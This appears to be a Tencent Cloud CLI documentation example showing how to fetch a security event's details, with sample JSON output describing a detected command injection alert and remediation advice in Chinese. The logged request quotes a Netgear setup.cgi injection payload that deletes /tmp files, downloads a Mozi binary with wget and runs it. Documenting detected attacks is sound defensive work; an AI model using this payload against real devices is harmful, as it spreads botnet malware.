**Example 1: 获取安全事件详情**



Input: 

```
tccli ssa DescribeEventDetail --cli-unfold-argument  \
    --Id gHj_wnABm0btT1OuvIAG \
    --Index event-tianmu-06-202003
```

Output: 
```
{
    "Response": {
        "Data": "{\"SsaSource\":\"流量威胁感知\",\"Name\":\"命令注入攻击\",\"Protocol_type\":\"HTTP\",\"Req_src_ip\":\"49.70.73.138\",\"Req_src_port\":3220,\"Req_dst_ip\":\"118.89.39.26\",\"Req_dst_port\":80,\"Event_1_type\":1,\"Event_2_type\":9,\"Level\":3,\"MachineName\":\"云鼎-张云飞-LINUX测试\",\"Event_time\":\"2020-03-10 13:51:44\",\"Status\":1,\"Req_cgi\":\"/setup.cgi\",\"Req_head\":\"GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm -rf /tmp/*;wget http://192.168.1.1:8088/Mozi.m -O /tmp/netgear;sh netgear&curpath=/&currentsetting.htm=1 HTTP/1.0\\r\\n\\r\\n\",\"Req_method\":\"GET\",\"Req_param\":\"next_file=netgear.cfg&todo=syscmd&cmd=rm -rf /tmp/*;wget http://192.168.1.1:8088/Mozi.m -O /tmp/netgear;sh netgear&curpath=/&currentsetting.htm=1\",\"Req_url\":\"/setup.cgi\",\"Fdesc\":\"通过易受攻击的应用程序在主机操作系统上执行任意命令。当应用程序将不安全的用户提供的数据（表单，cookie，HTTP标头等）传递给系统shell时，可能会发生命令注入攻击。\",\"Fsuggest\":\"1，根据告警信息，确认注入命令是否成功执行 \\n2，如果命令注入成功，及时进行木马清理，杀死恶意进程 \\n3，修补存在命令注入的风险点 \\n4，封禁攻击IP阻断进一步攻击的可能性\"}",
        "RequestId": "1ba104fc-e008-4f70-8d45-e72199004fa7"
    }
}
```

